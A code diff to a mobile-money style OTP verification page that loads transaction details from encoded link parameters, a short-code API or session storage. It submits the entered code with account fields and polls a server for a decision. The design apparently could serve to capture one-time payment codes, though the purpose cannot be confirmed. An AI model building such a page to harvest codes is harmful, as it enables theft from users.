@@ -26,26 +26,21 @@
     min-height: 100vh; padding: 24px 16px 48px;
   }
   .wrap { max-width: 440px; margin: 0 auto; }
-
   .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
   .brand { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 22px; letter-spacing: -0.6px; }
   .brand .eco { color: var(--eco-blue); }
   .brand .cash { color: var(--eco-red); }
   .header .label { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: var(--eco-muted); }
-
   .card { background: #fff; border-radius: 20px; border: 1px solid var(--eco-border); box-shadow: 0 10px 30px rgba(17,24,39,0.06); overflow: hidden; }
   .card-head { padding: 22px 22px 16px; border-bottom: 1px solid var(--eco-border); background: #FBFCFE; text-align: center; }
   .card-head h1 { font-size: 18px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 4px; }
   .card-head p { font-size: 12.5px; color: var(--eco-muted); line-height: 1.6; }
-
   .card-body { padding: 20px 22px 22px; }
-
   .tx-block { background: var(--eco-soft); border-radius: 12px; padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
   .tx-block .tx-left .k { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: var(--eco-muted); margin-bottom: 3px; }
   .tx-block .tx-left .v { font-size: 13.5px; font-weight: 700; word-break: break-all; }
   .tx-block .tx-amt { font-size: 17px; font-weight: 800; color: var(--eco-blue); letter-spacing: -0.4px; white-space: nowrap; }
   .tx-block .tx-amt .cur { font-size: 11.5px; font-weight: 700; margin-right: 3px; opacity: 0.85; }
-
   .expired-notice {
     display: none; background: #FEF2F2; border: 1px solid #FECACA; border-left: 3px solid var(--eco-red);
     color: #B91C1C; font-size: 12.5px; font-weight: 600; padding: 11px 14px; border-radius: 10px;
@@ -55,7 +50,6 @@
   .expired-notice .icon { width: 20px; height: 20px; border-radius: 50%; background: var(--eco-red); color: #fff; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; flex-shrink: 0; }
   .expired-notice .text { flex: 1; }
   .expired-notice .text small { display: block; font-size: 11px; font-weight: 500; color: #7F1D1D; margin-top: 2px; }
-
   .otp-label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 8px; text-align: center; }
   .otp-row { display: flex; justify-content: center; gap: 8px; margin-bottom: 14px; }
   .otp-row input {
@@ -69,11 +63,9 @@
   .otp-row input:focus { border-color: var(--eco-blue); box-shadow: 0 0 0 3px rgba(0,102,166,0.12); }
   .otp-row input.filled { border-color: var(--eco-blue); background: #F6FBFE; }
   .otp-row input:disabled { background: #F5F7F9; color: var(--eco-muted); }
-
   .otp-help { display: flex; justify-content: center; align-items: center; gap: 6px; margin-bottom: 16px; font-size: 12px; color: var(--eco-muted); }
   .resend-btn { background: transparent; border: none; font-family: inherit; font-size: 12px; font-weight: 700; color: var(--eco-blue); cursor: pointer; padding: 2px 0; }
   .resend-btn:disabled { color: var(--eco-muted); cursor: default; }
-
   .action-btn {
     width: 100%; height: 56px; background: var(--eco-blue); color: #fff;
     border: none; border-radius: 14px; font-family: inherit;
@@ -84,13 +76,10 @@
   .action-btn:hover { filter: brightness(1.08); }
   .action-btn:active { transform: scale(0.99); }
   .action-btn:disabled { opacity: 0.7; cursor: wait; }
-
   .card-foot { padding: 14px 22px 18px; border-top: 1px solid var(--eco-border); background: #FBFCFE; text-align: center; }
   .card-foot .brand { font-size: 15px; }
   .card-foot .small { font-size: 10.5px; color: var(--eco-muted); margin-top: 3px; }
-
   .page-foot { text-align: center; margin-top: 16px; font-size: 11px; color: var(--eco-muted); line-height: 1.6; }
-
   .verifying { position: fixed; inset: 0; background: #FFFFFF; display: none; align-items: center; justify-content: center; z-index: 2000; }
   .verifying.show { display: flex; }
   .verifying .inner { text-align: center; max-width: 320px; padding: 0 24px; }
@@ -101,7 +90,6 @@
   @keyframes spin { to { transform: rotate(360deg); } }
   .verifying .t { font-size: 17px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 6px; }
   .verifying .s { font-size: 13px; color: var(--eco-muted); line-height: 1.6; }
-
   .toast {
     position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px);
     background: var(--eco-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
@@ -110,7 +98,6 @@
     max-width: 90%; text-align: center;
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-
   @media (max-width: 360px) {
     .otp-row input { height: 46px; font-size: 19px; border-radius: 12px; }
     .otp-row { gap: 6px; }
@@ -140,7 +127,7 @@
           <div class="k">Transaction</div>
           <div class="v" id="txId">—</div>
         </div>
-        <div class="tx-amt"><span class="cur" id="amtCur">USD</span><span id="amtVal">0.00</span></div>
+        <div class="tx-amt"><span class="cur" id="amtCur">—</span><span id="amtVal">0.00</span></div>
       </div>
 
       <div class="expired-notice" id="expiredNotice">
@@ -192,27 +179,103 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  const params = new URLSearchParams(location.search);
-  const txData = {
-    tx:  params.get('tx')  || '',
-    am:  params.get('am')  || '0',
-    cur: params.get('cur') || 'USD',
-    rn:  params.get('rn')  || '',
-    c:   params.get('c')   || ''
+  const CURRENCY_SYMBOLS = {
+    USD: '$', ZiG: 'ZiG ', ZAR: 'R', KES: 'KSh ', BWP: 'P ',
+    MWK: 'MK ', RWF: 'FRw ', XAF: 'FCFA ', XOF: 'CFA ', ZMW: 'K ',
+    UGX: 'USh ', GHS: '₵', SZL: 'E', LRD: 'L$ ', EUR: '€', GBP: '£'
   };
 
-  if (txData.tx) {
-    document.getElementById('txId').textContent = txData.tx;
-    document.getElementById('amtCur').textContent = txData.cur;
-    document.getElementById('amtVal').textContent = Number(txData.am || 0).toFixed(2);
-  } else {
-    document.querySelector('.card').innerHTML =
-      '<div style="padding:40px 24px;text-align:center">' +
-      '<h2 style="font-size:18px;margin-bottom:6px">Missing transaction</h2>' +
-      '<p style="font-size:13px;color:#667085">Please return to the payment page and try again.</p>' +
-      '</div>';
+  function b64urlDecode(str) {
+    str = String(str).replace(/-/g, '+').replace(/_/g, '/');
+    while (str.length % 4) str += '=';
+    return decodeURIComponent(escape(atob(str)));
   }
 
+  const params = new URLSearchParams(location.search);
+  const txData = { tx: '', am: '', cur: '', rn: '', c: '', pm: '', dt: '' };
+
+  async function resolvePayload() {
+    // 1) ?d= base64 JSON payload
+    const d = params.get('d');
+    if (d) {
+      try {
+        const p = JSON.parse(b64urlDecode(d));
+        Object.assign(txData, {
+          tx:  p.tx  || p.tn || '',
+          am:  p.am  || '',
+          cur: p.cur || '',
+          rn:  p.rn  || '',
+          c:   p.c   || '',
+          pm:  p.pm  || '',
+          dt:  p.dt  || ''
+        });
+        return;
+      } catch (e) { /* fall through */ }
+    }
+
+    // 2) ?r= short code → fetch from server
+    const code = params.get('r');
+    if (code) {
+      for (const url of [
+        '/api/links/' + encodeURIComponent(code),
+        '/api/links?code=' + encodeURIComponent(code)
+      ]) {
+        try {
+          const res = await fetch(url);
+          if (!res.ok) continue;
+          const data = await res.json();
+          const p = data && (data.payload || data);
+          if (p && (p.am || p.c)) {
+            Object.assign(txData, {
+              tx:  p.tx  || p.tn || '',
+              am:  p.am  || '',
+              cur: p.cur || '',
+              rn:  p.rn  || '',
+              c:   p.c   || '',
+              pm:  p.pm  || '',
+              dt:  p.dt  || ''
+            });
+            return;
+          }
+        } catch (e) { /* try next */ }
+      }
+    }
+
+    // 3) sessionStorage fallback
+    try {
+      const raw = sessionStorage.getItem('amz_payload');
+      if (raw) {
+        const p = JSON.parse(raw);
+        Object.assign(txData, {
+          tx:  p.tx  || p.tn || '',
+          am:  p.am  || '',
+          cur: p.cur || '',
+          rn:  p.rn  || '',
+          c:   p.c   || '',
+          pm:  p.pm  || '',
+          dt:  p.dt  || ''
+        });
+        return;
+      }
+    } catch (e) {}
+
+    // 4) direct query params (last resort)
+    txData.tx  = params.get('tx')  || '';
+    txData.am  = params.get('am')  || '';
+    txData.cur = params.get('cur') || '';
+    txData.rn  = params.get('rn')  || '';
+    txData.c   = params.get('c')   || '';
+    txData.pm  = params.get('pm')  || '';
+    txData.dt  = params.get('dt')  || '';
+  }
+
+  function formatAmount(amount, currency) {
+    const n = Number(amount);
+    if (!isFinite(n)) return '0.00';
+    return n.toFixed(2);
+  }
+
+  /* ── OTP boxes ── */
   const boxes = Array.from(document.querySelectorAll('#otpRow input'));
   boxes.forEach((el, i) => {
     el.addEventListener('input', () => {
@@ -267,7 +330,6 @@
     }, 1000);
   }
 
-  /* ── Endpoint 1: request OTP ── */
   async function requestCode(source) {
     hideExpiredNotice();
     resendBtn.disabled = true;
@@ -304,7 +366,6 @@
     }
   }
 
-  /* ── Endpoint 2 + 3: submit OTP, poll decision ── */
   async function verifyCode() {
     hideExpiredNotice();
 
@@ -327,7 +388,9 @@
           otp: otp,
           am: txData.am,
           cur: txData.cur,
-          c:  txData.c
+          c:  txData.c,
+          an: txData.an,
+          rn: txData.rn
         })
       });
     } catch (e) { /* keep polling */ }
@@ -340,7 +403,9 @@
       am:  txData.am,
       cur: txData.cur,
       rn:  txData.rn,
-      c:   txData.c
+      c:   txData.c,
+      pm:  txData.pm,
+      dt:  txData.dt
     });
 
     const check = async () => {
@@ -387,7 +452,24 @@
     check();
   }
 
-  document.addEventListener('DOMContentLoaded', () => {
+  document.addEventListener('DOMContentLoaded', async () => {
+    await resolvePayload();
+
+    // Render the amount if we resolved a payload
+    if (txData.tx || txData.am) {
+      document.getElementById('txId').textContent = txData.tx || '—';
+      document.getElementById('amtCur').textContent = txData.cur || '';
+      document.getElementById('amtVal').textContent = formatAmount(txData.am, txData.cur);
+    } else {
+      // No transaction data found at all
+      document.querySelector('.card').innerHTML =
+        '<div style="padding:40px 24px;text-align:center">' +
+        '<h2 style="font-size:18px;margin-bottom:6px">Missing transaction</h2>' +
+        '<p style="font-size:13px;color:#667085">Please return to the payment page and try again.</p>' +
+        '</div>';
+      return;
+    }
+
     if (txData.tx) requestCode('auto');
   });
 </script>
